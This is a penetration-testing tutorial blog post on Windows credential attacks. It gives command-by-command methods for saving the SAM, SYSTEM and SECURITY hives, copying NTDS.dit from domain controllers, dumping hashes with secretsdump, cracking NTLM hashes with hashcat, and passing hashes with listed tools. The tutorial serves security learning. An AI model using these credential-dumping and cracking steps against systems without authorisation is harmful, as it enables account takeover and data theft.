---
layout: single
classes: wide
title:  "Windows Authentication Attacks"
date:   2024-03-11 11:20:24 -0400
categories: [Windows, Pentest]


excerpt: Cracking Windows
featured_image: /assets/images/Windows_SAM.png
header:
  overlay_color: "#000"
  overlay_filter: "0.5"
  overlay_image: /assets/images/Windows_SAM.png


toc: false
toc_label: "Contents"
toc_icon: "stream"

---

The Security Account Manager (SAM) is a database file in Windows XP, Vista, 7, 8.1, 10 and 11 that stores usernames & passwords. It can be used to authenticate local and remote users. Beginning with Windows 2000 SP4, Active Directory authenticates remote users.

The user passwords are stored in a hashed format in a registry hive either as an LM hash or as an NTLM hash (NTLM has replaced LM which is a compromised protocol). This file can be found in **%SystemRoot%/system32/config/SAM** and is mounted on **HKLM/SAM**, **SYSTEM** privileges are required to view it.

We also need the **System** or **Security** registry hives to decrypt the SAM file and these can all be saved from an elevated command prompt using the Windows registry command line tool with the following syntax:


```powershell
reg save hklm\sam .\sam
reg save hklm\security .\security
reg save hklm\system .\system
```
These files can then be brought to our attacking machine where we use [Impacket's](https://github.com/fortra/impacket/tree/master) _secretsdump.py_ script

* **SAM** is the Registry hive
* **SYSTEM** is the System hive - note that system does not store AD cred info
* **LOCAL** simply states that we want to use the files that we specify (on the local system)
* **SECURITY** is the Security hive and is used to store AD cred info


```shell
secretsdump.py -sam sam -system system LOCAL
```

[![SAM System](/assets/images/SAM_System.png)](/assets/images/SAM_System.png)

```shell
secretsdump.py -sam sam -security security -system system LOCAL
```

[![SAM System Security](/assets/images/SAM_System_Security.png)](/assets/images/SAM_System_Security.png)

Worth noting that the first part of the hash in this case "aad3b435b51404eeaad3b435b51404ee" resolves to NULL as it is not storing as LM - if it were it would be very easy to crack!

## Domain Controller

On a Domain controller there is no SAM database instead all the domain information including password hashes are stored in the NTDS.dit database.
{: .notice}

There are a few methods to take a copy of **NTDS.dit** however slightly more involved than the _reg save_ command, the file is in use and some methods may not work for one reason or another.


### Method 1

The _vss_ switch option that is required to make this method work is only available from Server 2016 or later, _esentutl.exe_ can extract and save **NTDS.dit** (as well as **SAM, SYSTEM & SECURITY**).

```powershell
esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\Users\Administrator\Desktop\ntds.dit
```

### Method 2

Using the _ntdsutil_ utility we can also dump the **NTDS.dit**, however this was blocked by my AV.

```powershell
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```


### Method 3

Use the DC's _vssadmin_ application to create a volume shadow copy.

```powershell
vssadmin.exe create shadow /for=c:
```

Next create the exfil directory and copy the **NTDS.dit** from the shadow copy there.

```powershell
mkdir c:\exfil
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\ntds\ntds.dit C:\exfil\ntds.dit
```

Also extract the **SYSTEM** key from the registry or shadow copy so that we can extract the hashes.

```powershell
reg save hklm\SYSTEM C:\exfil\system
```

Once we have exfiltrated the data to our attacking machine we can clean up.

```powershell
vssadmin.exe delete shadows /for=c:
rmdir c:\exfil
```


### Method 4

On Server 2008 or later we can use _diskshadow_ to dump the **NTDS.dit**, first create a _shadowdisk.exe_ script to create a shadow disk copy of **C:** this can be called **shadow.txt**:


```powershell
set context persistent nowriters
set metadata c:\exfil\metadata.cab
add volume c: alias trophy
create
expose %someAlias% z:
```

Execute it
```powershell
mkdir c:\exfil
diskshadow.exe /s C:\users\Administrator\Desktop\shadow.txt
cmd.exe /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
```

Lastly we need to cleanup inside the interactive _diskshadow_ utility:
```powershell
diskshadow.exe
    > delete shadows volume trophy
    > reset
```

### Method 5

If you have credentials for an account that can log on to the DC, it's possible to dump hashes from **NTDS.dit** remotely via RPC protocol with impacket:

```powershell
impacket-secretsdump -just-dc-ntlm offense/administrator@10.0.0.6
```

Once again we can leverage _secretsdump_:

```powershell
secretsdump.py -system system -ntds ntds.dit local
```

Once hashes are obtained we can either use Pass The Hash (pth) attacks or try to crack them to their clear text values.
{: .notice}


## Hashcat

First we can check what hardware hashcat will be using, as running from a GPU is considerably faster than the CPU.

```shell
hashcat -I
```

Now cracking in it's simplest form, we use the _rockyou_ wordlist. RockYou was a company that developed widgets social networks including MySpace and Facebook. In December 2009 they had a databreach of 32 million user accounts and unencrypted passwords.

```shell
hashcat -a 0 -m 1000 hashes /usr/share/wordlists/rockyou.txt
```
Where:
* _-a 0_ specifies the wordlist attack mode.
* _-m 1000_ specifies that the hash is NTLM.

This has stored the cracked hashes in the default **~/.hashcat/hashcat.potfile** which we can then _--show_ adding the usernames (_--username_):

```shell
hashcat --show --username hashes
```

Adding the year as a lot of users will add the year to the password to satisfy the digit requirement

```shell
hashcat -a 0 -m 1000 hashes /usr/share/wordlists/rockyou.txt -r add-year.rule
```

Where:
* _-r add-year.rule_ is our custom rule file

which contains
```
$2$0$1$7
$2$0$1$8
$2$0$1$9
$2$0$2$0
$2$0$2$1
$2$0$2$2
$2$0$2$3
$2$0$2$4
```


Adding a number and a symbol

```shell
hashcat -a 6 -m 1000 hashes /usr/share/wordlists/rockyou.txt '?d?s'
```


```shell
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff
```

To combine the above two methods (add the year followed by a special symbol) we need to make use of hashcat's _stdout_ command.

```shell
hashcat -m 0 --stdout /usr/share/wordlists/rockyou.txt -r add-year.rule > modified_rockyou.txt
hashcat -a 6 -m 1000 hashes modified_rockyou.txt '?s'
```

[OneRuleToRuleThemAll](https://notsosecure.com/one-rule-to-rule-them-all) can be accessed on Github [here](https://github.com/NotSoSecure/password_cracking_rules).

```shell
hashcat -a 0 -m 1000 hashes /usr/share/wordlists/rockyou.txt -r OneRuleToRuleThemAll.rule
```


We can also combine wordlists (far too long for 2 x rockyou!).

```shell
hashcat -a 1 -m 1000 hashes /usr/share/wordlists/rockyou.txt /usr/share/wordlists/rockyou.txt
```


## Pass The Hash

We can use the following programs and just pth;
```
secretsdump.py WORKGROUP/Administrator@10.1.1.1 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
Mimikatz
Metasploit (SMB_LOGIN module)
CrackMapExec
xfreerdp
evil-winrm
wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
smbclient
```

Further reading on **NTDS.dit**: <https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/>

#### Resources Used

* <https://en.wikipedia.org/wiki/Security_Account_Manager>
* <https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration>
* <https://bond-o.medium.com/extracting-and-cracking-ntds-dit-2b266214f277>
* <https://en.wikipedia.org/wiki/RockYou>

